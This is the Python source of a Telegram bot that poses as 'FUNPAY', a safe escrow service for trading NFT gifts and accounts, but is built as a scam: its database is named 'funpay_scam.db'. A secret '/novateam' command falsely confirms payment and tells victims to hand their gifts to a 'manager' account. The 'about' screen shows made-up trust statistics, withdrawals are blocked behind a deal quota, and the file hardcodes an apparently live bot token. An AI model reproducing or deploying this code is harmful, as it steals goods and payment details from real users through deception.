import asyncio
import logging
import sqlite3
import uuid
import os
import re
from datetime import datetime
from aiohttp import web

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ==================================================
# НАСТРОЙКИ
# ==================================================
BOT_TOKEN = "8497462129:AAEC2hO1pZVwXA2eATQp4uk3YdSX63K0hAs"
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не задан в переменных окружения!")

ADMIN_IDS = [8822297551]
PHOTO_URL = "https://ibb.co/dsfvdDB7"
BOT_USERNAME = os.getenv("BOT_USERNAME", "FunpayTrustly_robot")
PORT = int(os.getenv("PORT", 8080))
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://funpayd.onrender.com")

logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# ==================================================
# БАЗА ДАННЫХ
# ==================================================
try:
    conn = sqlite3.connect("funpay_scam.db", check_same_thread=False)
    cur = conn.cursor()
except Exception as e:
    logging.error(f"Не удалось подключиться к БД: {e}")
    raise

def init_db():
    try:
        cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            lang TEXT DEFAULT 'ru',
            card TEXT,
            crypto TEXT,
            stars_username TEXT,
            ref_count INTEGER DEFAULT 0,
            deals_count INTEGER DEFAULT 0,
            successful_deals INTEGER DEFAULT 0
        )
        """)
        cur.execute("""
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            seller_id INTEGER,
            buyer_id INTEGER,
            deal_type TEXT,
            description TEXT,
            amount INTEGER,
            currency TEXT,
            seller_req TEXT,
            buyer_req TEXT,
            status TEXT,
            seller_username TEXT,
            buyer_username TEXT,
            created_at TEXT
        )
        """)
        cur.execute("""
        CREATE TABLE IF NOT EXISTS referrals (
            referrer_id INTEGER,
            referred_id INTEGER,
            PRIMARY KEY (referrer_id, referred_id)
        )
        """)
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка инициализации БД: {e}")
        raise

init_db()

# ==================================================
# СОСТОЯНИЯ FSM
# ==================================================
class DealStates(StatesGroup):
    seller_type = State()
    seller_description = State()
    seller_payment_method = State()
    seller_amount = State()
    seller_requisites = State()
    buyer_type = State()
    buyer_description = State()
    buyer_payment_method = State()
    buyer_amount = State()
    buyer_seller_username = State()
    confirm_participation = State()
    requisites_input = State()
    funds_deposit = State()
    profile_requisites_input = State()

# ==================================================
# СЛОВАРЬ ПЕРЕВОДОВ
# ==================================================
LOCALES = {
    'ru': {
        'main_menu': "🛡️ FUNPAY\n\nБезопасный гарант для сделок в Telegram.\n\n📌 Что внутри:\n• защита от мошенников\n• удержание средств до завершения сделки\n• история и статусы сделок\n• поддержка через @GiftsforFunpay\n\n⬇️ Выберите действие ниже.",
        'create_deal_msg': 'Выберите вашу роль в сделке:',
        'create_deal_btn': 'Создать сделку',
        'funds_btn': 'Средства',
        'funds_menu': 'Выберите действие:',
        'seller_role': 'Выберите тип сделки:',
        'buyer_role': 'Выберите тип сделки:',
        'deal_type_account': 'Опишите предмет сделки.\n\nУкажите важные детали, условия передачи и дополнительные договоренности.',
        'deal_type_gift': 'Отправьте ссылку на NFT Gift.\n\nМожно указать одну или несколько ссылок, например:\nhttps://t.me/nft/DurovsCap-1',
        'payment_method': 'Выберите способ оплаты:',
        'amount': 'Введите сумму сделки в {currency}.\n\nТолько целое число.',
        'deal_created': '✅ Сделка #{deal_id} создана\n\nТип: {deal_type}\nОписание: {description}\nСумма: {amount} {currency}\nРеквизиты: {requisites}\n\nСсылка для покупателя:\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\nСтатус: ожидаем покупателя.',
        'deal_created_buyer': '✅ Сделка #{deal_id} создана\n\nТип: {deal_type}\nОписание: {description}\nСумма: {amount} {currency}\n\nОжидаем подтверждение продавца: {seller_username}\n\nСсылка для продавца:\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'deal_show_seller': 'Сделка #{deal_id}\nТип: {deal_type}\nОписание: {description}\nСумма: {amount} {currency}\nОплата: {currency}\n\nВы указаны как продавец. Подтвердите участие.',
        'deal_show_buyer': '✅ Вы подключены к сделке #{deal_id}.',
        'deal_status': 'Сделка #{deal_id}\nТип: {deal_type}\nОписание: {description}\nСумма: {amount} {currency}\nСтатус: {status}',
        'confirm_requisites': 'Выберите тип реквизитов для подтверждения:',
        'requisites_saved': 'Реквизиты сохранены. Ожидаем оплату.',
        'buyer_notify': '✅ Продавец подтвердил участие в сделке #{deal_id}\n\nТип: {deal_type}\nОписание: {description}\nСумма: {amount} {currency}\nРеквизиты продавца: {seller_req}',
        'deal_confirm_seller': '✅ Вы подтвердили участие. Ожидайте оплаты от покупателя.',
        'novateam_seller': '💸 Оплата подтверждена\n\nСделка: #{deal_id}\nПокупатель: @{buyer}\nСумма: {amount} {currency}\nПредмет: {description}\n\n🛡 Передайте Подарок Менеджеру @GiftsForFunpay',
        'novateam_buyer': '✅ Оплата подтверждена по сделке #{deal_id}.',
        'novateam_summary': '✅ Подтверждено {count} сделок.',
        'funds_deposit': 'Введите ID сделки для оплаты',
        'funds_deposit_error': '🚫 Сделка не найдена.',
        'funds_withdraw': 'Вывести деньги можно только от 2 сделок.\nУ Вас 0/2.',
        'my_deals_empty': '📭 У вас нет активных сделок.',
        'my_deals_list': '📋 Ваши сделки:\n\n{deals}',
        'requisites_menu': '💳 Ваши реквизиты:\n\nВыберите тип для просмотра или изменения.',
        'requisites_card': 'Введите номер банковской карты',
        'requisites_crypto': 'Введите адрес криптокошелька',
        'requisites_stars': 'Введите юзернейм для получения Stars.\n\nНапример: @username',
        'requisites_saved': 'Реквизиты сохранены.',
        'lang_menu': '🌐 Выберите язык / Choose language / 选择语言:',
        'lang_set': 'Язык установлен: {lang}',
        'support': '📞 Поддержка: @GiftsforFunpay\n\nПо всем вопросам обращайтесь к менеджеру.',
        'verify': 'Верификация доступна пользователям с 30+ успешными сделками и оборотом от 1500 USDT.\n\nПреимущества:\n• автовывод средств\n• приоритетная поддержка\n• ускоренное решение спорных ситуаций\n\nПодайте заявку, и администрация рассмотрит ее.',
        'referral': '👥 Реферальная система\n\nВаша реферальная ссылка:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\nПриглашено: {ref_count} человек',
        'about': 'Всего сделок: 107107\nУспешных сделок: 103835\nОбщий объем: $1105228\nРейтинг: 4.9/5.0\nОнлайн: 15756\n\n🛡 Гарант-сервис\n✅ Проверенные продавцы\n📢 Поддержка 24/7',
        'back': '🔙 Назад',
        'seller': 'Я продавец',
        'buyer': 'Я покупатель',
        'account': 'Аккаунт',
        'gift': 'NFT Gift',
        'card': 'Карта',
        'crypto': 'Крипта',
        'stars': 'Stars',
        'rub': '🇷🇺 Рубли',
        'uah': '🇺🇦 Гривны',
        'byn': '🇧🇾 BYN',
        'usdt': '💎 USDT',
        'ton': '💎 TON',
        'error_own_ref': '❌ Нельзя перейти по своей собственной реферальной ссылке.',
        'error_own_deal': '❌ Вы являетесь создателем этой сделки. Перейти по собственной ссылке нельзя!',
        'my_deals': 'Мои сделки',
        'requisites': 'Реквизиты',
        'lang': 'Язык',
        'support': 'Поддержка',
        'verify': 'Верификация',
        'referral': 'Рефералы',
        'about': 'О сервисе'
    }
}

def tr(key, lang='ru', **kwargs):
    text = LOCALES.get(lang, LOCALES['ru']).get(key, key)
    if isinstance(text, dict):
        return text
    try:
        return text.format(**kwargs)
    except:
        return text

# ==================================================
# КЛАВИАТУРЫ
# ==================================================
def get_main_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=tr('create_deal_btn', lang), callback_data="create_deal"), InlineKeyboardButton(text=tr('funds_btn', lang), callback_data="funds"))
    builder.row(InlineKeyboardButton(text=tr('my_deals', lang), callback_data="my_deals"), InlineKeyboardButton(text=tr('requisites', lang), callback_data="requisites"))
    builder.row(InlineKeyboardButton(text=tr('lang', lang), callback_data="lang"), InlineKeyboardButton(text=tr('support', lang), callback_data="support"))
    builder.row(InlineKeyboardButton(text=tr('verify', lang), callback_data="verify"), InlineKeyboardButton(text=tr('referral', lang), callback_data="referral"))
    builder.row(InlineKeyboardButton(text=tr('about', lang), callback_data="about"))
    return builder.as_markup()

def get_roles_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=tr('seller', lang), callback_data="seller_role"))
    builder.row(InlineKeyboardButton(text=tr('buyer', lang), callback_data="buyer_role"))
    builder.row(InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_deal_types(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=tr('account', lang), callback_data="deal_type_account"))
    builder.row(InlineKeyboardButton(text=tr('gift', lang), callback_data="deal_type_gift"))
    builder.row(InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_payment_methods(lang="ru"):
    items = [
        (tr('rub', lang), 'rub'),
        (tr('uah', lang), 'uah'),
        (tr('byn', lang), 'byn'),
        (tr('stars', lang), 'stars'),
        (tr('usdt', lang), 'usdt'),
        (tr('ton', lang), 'ton')
    ]
    builder = InlineKeyboardBuilder()
    for label, code in items:
        builder.row(InlineKeyboardButton(text=label, callback_data=f"payment_{code}"))
    builder.row(InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_requisites_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Карта", callback_data="req_card"))
    builder.row(InlineKeyboardButton(text="Крипта", callback_data="req_crypto"))
    builder.row(InlineKeyboardButton(text="Stars", callback_data="req_stars"))
    builder.row(InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_funds_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💳 Пополнить", callback_data="funds_deposit"))
    builder.row(InlineKeyboardButton(text="💸 Вывести", callback_data="funds_withdraw"))
    builder.row(InlineKeyboardButton(text=tr('back', lang), callback_data="main_menu"))
    return builder.as_markup()

# ==================================================
# ОБРАБОТЧИКИ
# ==================================================
@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    user_id = message.from_user.id
    username = message.from_user.username or "NoUsername"
    lang = 'ru'

    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        if row:
            lang = row[0]
        else:
            cur.execute("INSERT INTO users (user_id, username, lang) VALUES (?, ?, ?)", (user_id, username, lang))
            conn.commit()
    except Exception as e:
        logging.error(f"Ошибка при работе с пользователем {user_id}: {e}")
        await message.answer("🚫 Внутренняя ошибка. Попробуйте позже.")
        return

    args = message.text.split()
    if len(args) > 1:
        param = args[1].strip()
        if param.startswith("deal_"):
            deal_id = param[5:].strip()
            try:
                cur.execute("SELECT seller_id, buyer_id, seller_username, status FROM deals WHERE deal_id=?", (deal_id,))
                deal = cur.fetchone()
                if not deal:
                    await message.answer("🚫 Сделка не найдена.")
                    return
                seller_id, buyer_id, seller_username, status = deal
                
                if user_id == seller_id or user_id == buyer_id:
                    await message.answer(tr('error_own_deal', lang))
                    await bot.send_message(message.chat.id, tr('main_menu', lang), reply_markup=get_main_menu(lang), parse_mode="HTML")
                    return

                if buyer_id is None:
                    cur.execute("UPDATE deals SET buyer_id=?, buyer_username=? WHERE deal_id=?", (user_id, username, deal_id))
                    conn.commit()
                    await message.answer(f"✅ Вы присоединились к сделке #{deal_id} как покупатель.")
                    if seller_id:
                        await bot.send_message(seller_id, f"👤 Покупатель @{username} присоединился к сделке #{deal_id}.")
                elif seller_id is None:
                    cur.execute("UPDATE deals SET seller_id=?, seller_username=? WHERE deal_id=?", (user_id, username, deal_id))
                    conn.commit()
                    await message.answer(f"✅ Вы стали продавцом в сделке #{deal_id}.")
                elif user_id != seller_id and user_id != buyer_id:
                    await message.answer("ℹ️ У этой сделки уже есть покупатель и продавец. Вы не можете в ней участвовать.")
            except Exception as e:
                logging.error(f"Ошибка при обработке deal ссылки: {e}")
                await message.answer("🚫 Ошибка при присоединении к сделке.")
                return
            await show_deal(message, deal_id, user_id, lang)
            return
            
        elif param.startswith("ref"):
            try:
                ref_id = int(param[3:].strip())
                if ref_id == user_id:
                    await message.answer(tr('error_own_ref', lang))
                elif ref_id != user_id:
                    cur.execute("INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)", (ref_id, user_id))
                    cur.execute("UPDATE users SET ref_count = ref_count + 1 WHERE user_id=?", (ref_id,))
                    conn.commit()
                    await message.answer("✅ Вы были приглашены по реферальной ссылке!")
            except Exception as e:
                logging.error(f"Ошибка реферальной ссылки: {e}")

    await bot.send_message(message.chat.id, tr('main_menu', lang), reply_markup=get_main_menu(lang), parse_mode="HTML")

async def show_deal(message: Message, deal_id: str, user_id: int, lang: str):
    try:
        cur.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
        deal = cur.fetchone()
        if not deal:
            await message.answer("🚫 Сделка не найдена.")
            return
        (d_id, seller_id, buyer_id, d_type, desc, amount, curr, seller_req, buyer_req, status, seller_username, buyer_username, created) = deal

        if user_id != seller_id and user_id != buyer_id:
            if buyer_id is None:
                cur.execute("UPDATE deals SET buyer_id=?, buyer_username=? WHERE deal_id=?", (user_id, message.from_user.username or "NoUsername", deal_id))
                conn.commit()
                await message.answer(f"✅ Вы присоединились к сделке #{deal_id} как покупатель.")
                cur.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
                deal = cur.fetchone()
                (d_id, seller_id, buyer_id, d_type, desc, amount, curr, seller_req, buyer_req, status, seller_username, buyer_username, created) = deal
                if seller_id:
                    await bot.send_message(seller_id, f"👤 Покупатель @{message.from_user.username} присоединился к сделке #{deal_id}.")
            elif seller_id is None:
                cur.execute("UPDATE deals SET seller_id=?, seller_username=? WHERE deal_id=?", (user_id, message.from_user.username or "NoUsername", deal_id))
                conn.commit()
                await message.answer(f"✅ Вы стали продавцом в сделке #{deal_id}.")
                cur.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
                deal = cur.fetchone()
                (d_id, seller_id, buyer_id, d_type, desc, amount, curr, seller_req, buyer_req, status, seller_username, buyer_username, created) = deal
            else:
                await message.answer("🚫 В этой сделке уже есть продавец и покупатель.")
                return

        if user_id == seller_id:
            text = tr('deal_show_seller', lang).format(deal_id=d_id, deal_type=d_type, description=desc, amount=amount, currency=curr)
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Подтвердить участие", callback_data=f"confirm_seller_{deal_id}")]
            ])
            await bot.send_message(message.chat.id, text, reply_markup=kb, parse_mode="HTML")
        elif user_id == buyer_id:
            text = tr('deal_show_buyer', lang).format(deal_id=d_id)
            await message.answer(text)
        else:
            await message.answer("🚫 Вы не являетесь участником этой сделки.")
    except Exception as e:
        logging.error(f"Ошибка в show_deal: {e}")
        await message.answer("🚫 Ошибка при отображении сделки.")

@dp.callback_query(F.data == "main_menu")
async def main_menu_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('main_menu', lang), reply_markup=get_main_menu(lang), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('create_deal_msg', lang), reply_markup=get_roles_menu(lang), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "funds")
async def funds_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('funds_menu', lang), reply_markup=get_funds_menu(lang), parse_mode="HTML")
    await callback.answer()

# ==================================================
# FSM ДЛЯ СОЗДАНИЯ СДЕЛКИ (ПРОДАВЕЦ)
# ==================================================
@dp.callback_query(F.data == "seller_role")
async def seller_role(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('seller_role', lang), reply_markup=get_deal_types(lang), parse_mode="HTML")
    await state.set_state(DealStates.seller_type)
    await callback.answer()

@dp.callback_query(DealStates.seller_type, F.data.startswith("deal_type_"))
async def seller_type_chosen(callback: CallbackQuery, state: FSMContext):
    deal_type = callback.data.split("_")[2]
    await state.update_data(deal_type=deal_type)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('deal_type_account' if deal_type == 'account' else 'deal_type_gift', lang), parse_mode="HTML")
    await state.set_state(DealStates.seller_description)
    await callback.answer()

@dp.message(DealStates.seller_description)
async def seller_description(message: Message, state: FSMContext):
    await state.update_data(description=message.text)
    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(message.chat.id, tr('payment_method', lang), reply_markup=get_payment_methods(lang), parse_mode="HTML")
    await state.set_state(DealStates.seller_payment_method)

@dp.callback_query(DealStates.seller_payment_method, F.data.startswith("payment_"))
async def seller_payment_method(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('amount', lang, currency=currency.upper()), parse_mode="HTML")
    await state.set_state(DealStates.seller_amount)
    await callback.answer()

@dp.message(DealStates.seller_amount)
async def seller_amount(message: Message, state: FSMContext):
    data = await state.get_data()
    if 'currency' not in data:
        await state.clear()
        await message.answer("⚠️ Сессия сброшена (валюта не найдена). Начните заново.")
        user_id = message.from_user.id
        try:
            cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
            row = cur.fetchone()
            lang = row[0] if row else 'ru'
        except:
            lang = 'ru'
        await bot.send_message(message.chat.id, tr('main_menu', lang), reply_markup=get_main_menu(lang), parse_mode="HTML")
        return

    digits = re.sub(r'[^0-9]', '', message.text)
    if not digits:
        await message.answer("⚠️ Введите сумму только цифрами (пример: 500).")
        return
    amount = int(digits)
    if amount <= 0:
        await message.answer("⚠️ Сумма должна быть больше нуля.")
        return

    currency = data['currency']
    await state.update_data(amount=amount)

    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'

    if currency in ['rub', 'uah', 'byn']:
        req_text = "Введите номер карты. На нее будет отправлена оплата после завершения сделки."
    elif currency == 'stars':
        req_text = "Введите юзернейм для получения Stars.\n\nНапример: @username"
    elif currency in ['usdt', 'ton']:
        req_text = "Введите адрес криптокошелька"
    else:
        await state.clear()
        await message.answer("🚫 Неизвестная валюта. Начните заново.")
        await bot.send_message(message.chat.id, tr('main_menu', lang), reply_markup=get_main_menu(lang), parse_mode="HTML")
        return

    await bot.send_message(message.chat.id, req_text, parse_mode="HTML")
    await state.set_state(DealStates.seller_requisites)

@dp.message(DealStates.seller_requisites)
async def seller_requisites(message: Message, state: FSMContext):
    requisites = message.text.strip()
    if not requisites:
        await message.answer("⚠️ Реквизиты не могут быть пустыми. Введите данные.")
        return
    await state.update_data(seller_req=requisites)
    data = await state.get_data()
    deal_id = str(uuid.uuid4())[:8]
    seller_id = message.from_user.id
    seller_username = message.from_user.username or "NoUsername"
    created_at = datetime.now().isoformat()

    try:
        cur.execute("""
            INSERT INTO deals (deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (deal_id, seller_id, None, data['deal_type'], data['description'], data['amount'], data['currency'], requisites, None, 'active', seller_username, None, created_at))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка создания сделки: {e}")
        await message.answer("🚫 Ошибка при создании сделки. Попробуйте позже.")
        await state.clear()
        return

    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    text = tr('deal_created', lang).format(
        deal_id=deal_id,
        deal_type=data['deal_type'],
        description=data['description'],
        amount=data['amount'],
        currency=data['currency'],
        requisites=requisites,
        bot_username=BOT_USERNAME
    )
    await bot.send_message(message.chat.id, text, parse_mode="HTML")
    await state.clear()

# ==================================================
# FSM ДЛЯ СОЗДАНИЯ СДЕЛКИ (ПОКУПАТЕЛЬ)
# ==================================================
@dp.callback_query(F.data == "buyer_role")
async def buyer_role(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('buyer_role', lang), reply_markup=get_deal_types(lang), parse_mode="HTML")
    await state.set_state(DealStates.buyer_type)
    await callback.answer()

@dp.callback_query(DealStates.buyer_type, F.data.startswith("deal_type_"))
async def buyer_type_chosen(callback: CallbackQuery, state: FSMContext):
    deal_type = callback.data.split("_")[2]
    await state.update_data(deal_type=deal_type)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('deal_type_account' if deal_type == 'account' else 'deal_type_gift', lang), parse_mode="HTML")
    await state.set_state(DealStates.buyer_description)
    await callback.answer()

@dp.message(DealStates.buyer_description)
async def buyer_description(message: Message, state: FSMContext):
    await state.update_data(description=message.text)
    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(message.chat.id, tr('payment_method', lang), reply_markup=get_payment_methods(lang), parse_mode="HTML")
    await state.set_state(DealStates.buyer_payment_method)

@dp.callback_query(DealStates.buyer_payment_method, F.data.startswith("payment_"))
async def buyer_payment_method(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await bot.send_message(callback.message.chat.id, tr('amount', lang, currency=currency.upper()), parse_mode="HTML")
    await state.set_state(DealStates.buyer_amount)
    await callback.answer()

@dp.message(DealStates.buyer_amount)
async def buyer_amount(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("⚠️ Введите целое число.")
        return
    amount = int(message.text)
    if amount <= 0:
        await message.answer("⚠️ Сумма должна быть больше нуля.")
        return
    await state.update_data(amount=amount)
    await bot.send_message(message.chat.id, "Введите @username продавца.\n\nНапример: @seller", parse_mode="HTML")
    await state.set_state(DealStates.buyer_seller_username)

@dp.message(DealStates.buyer_seller_username)
async def buyer_seller_username(message: Message, state: FSMContext):
    seller_username = message.text.strip()
    if not seller_username.startswith("@"):
        seller_username = "@" + seller_username
    await state.update_data(seller_username=seller_username)
    data = await state.get_data()
    deal_id = str(uuid.uuid4())[:8]
    buyer_id = message.from_user.id
    buyer_username = message.from_user.username or "NoUsername"
    created_at = datetime.now().isoformat()

    try:
        cur.execute("""
            INSERT INTO deals (deal_id, seller_id, buyer_id, deal_type, description, amount, currency, seller_req, buyer_req, status, seller_username, buyer_username, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (deal_id, None, buyer_id, data['deal_type'], data['description'], data['amount'], data['currency'], None, None, 'waiting', seller_username, buyer_username, created_at))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка создания сделки покупателем: {e}")
        await message.answer("🚫 Ошибка при создании сделки. Попробуйте позже.")
        await state.clear()
        return

    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    text = tr('deal_created_buyer', lang).format(
        deal_id=deal_id,
        deal_type=data['deal_type'],
        description=data['description'],
        amount=data['amount'],
        currency=data['currency'],
        seller_username=seller_username,
        bot_username=BOT_USERNAME
    )
    await bot.send_message(message.chat.id, text, parse_mode="HTML")

    cur.execute("SELECT user_id FROM users WHERE username=?", (seller_username[1:],))
    row = cur.fetchone()
    if row:
        seller_id = row[0]
        await bot.send_message(seller_id, f"📦 Покупатель @{buyer_username} создал сделку #{deal_id}. Перейдите по ссылке для подтверждения:\nhttps://t.me/{BOT_USERNAME}?start=deal_{deal_id}")

    await state.clear()

# ==================================================
# ПОДТВЕРЖДЕНИЕ ПРОДАВЦА (БЕЗ ДУБЛЕЙ)
# ==================================================
@dp.callback_query(F.data.startswith("confirm_seller_"))
async def confirm_seller(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    user_id = callback.from_user.id
    username = callback.from_user.username
    try:
        cur.execute("SELECT seller_id, buyer_id, status, seller_username FROM deals WHERE deal_id=?", (deal_id,))
        deal = cur.fetchone()
        if not deal:
            await callback.answer("🚫 Сделка не найдена.")
            return
        seller_id, buyer_id, status, seller_username = deal

        if status == 'active':
            await callback.answer("⛔ Вы уже подтвердили участие в этой сделке!", show_alert=True)
            return
        if status == 'completed':
            await callback.answer("⛔ Эта сделка уже завершена!", show_alert=True)
            return

        if user_id != seller_id:
            if seller_id is None and seller_username == username:
                cur.execute("UPDATE deals SET seller_id=? WHERE deal_id=?", (user_id, deal_id))
                conn.commit()
            else:
                await callback.answer("⛔ Вы не продавец в этой сделке.")
                return

        cur.execute("UPDATE deals SET status='active' WHERE deal_id=?", (deal_id,))
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка подтверждения сделки: {e}")
        await callback.answer("🚫 Ошибка.")
        return

    try:
        cur.execute("SELECT buyer_id, buyer_username, deal_type, description, amount, currency, seller_req FROM deals WHERE deal_id=?", (deal_id,))
        buyer_id, buyer_username, deal_type, description, amount, currency, seller_req = cur.fetchone()
        if buyer_id:
            cur.execute("SELECT lang FROM users WHERE user_id=?", (buyer_id,))
            row = cur.fetchone()
            lang = row[0] if row else 'ru'
            await bot.send_message(buyer_id, tr('buyer_notify', lang).format(
                deal_id=deal_id,
                deal_type=deal_type,
                description=description,
                amount=amount,
                currency=currency,
                seller_req=seller_req if seller_req else "Не указаны"
            ), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка уведомления покупателя: {e}")

    cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
    row = cur.fetchone()
    seller_lang = row[0] if row else 'ru'
    await callback.message.edit_text(tr('deal_confirm_seller', seller_lang), parse_mode="HTML")
    await callback.answer("✅ Успешно!", show_alert=False)

# ==================================================
# СЕКРЕТНАЯ КОМАНДА
# ==================================================
@dp.message(Command("novateam"))
async def novateam(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or "NoUsername"

    cur.execute("""
        SELECT deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type
        FROM deals
        WHERE (seller_id = ? OR buyer_id = ?) AND status != 'completed'
    """, (user_id, user_id))
    deals = cur.fetchall()

    if not deals:
        await message.answer("🚫 У вас нет активных сделок.")
        return

    count = 0
    for deal in deals:
        deal_id, seller_id, buyer_id, status, seller_username, buyer_username, amount, currency, description, deal_type = deal

        if user_id == buyer_id:
            if seller_id:
                cur.execute("SELECT lang FROM users WHERE user_id=?", (seller_id,))
                row = cur.fetchone()
                seller_lang = row[0] if row else 'ru'
                seller_text = tr('novateam_seller', seller_lang).format(
                    deal_id=deal_id,
                    buyer=username,
                    amount=amount,
                    currency=currency,
                    description=description
                )
                await bot.send_message(seller_id, seller_text)

        elif user_id == seller_id:
            if buyer_id:
                cur.execute("SELECT lang FROM users WHERE user_id=?", (buyer_id,))
                row = cur.fetchone()
                buyer_lang = row[0] if row else 'ru'
                await bot.send_message(buyer_id, tr('novateam_buyer', buyer_lang).format(deal_id=deal_id))

        cur.execute("UPDATE deals SET status='completed' WHERE deal_id=?", (deal_id,))
        count += 1

    conn.commit()

    cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
    row = cur.fetchone()
    lang = row[0] if row else 'ru'
    summary = tr('novateam_summary', lang).format(count=count)
    await message.answer(summary)

# ==================================================
# ОСТАЛЬНЫЕ ОБРАБОТЧИКИ
# ==================================================
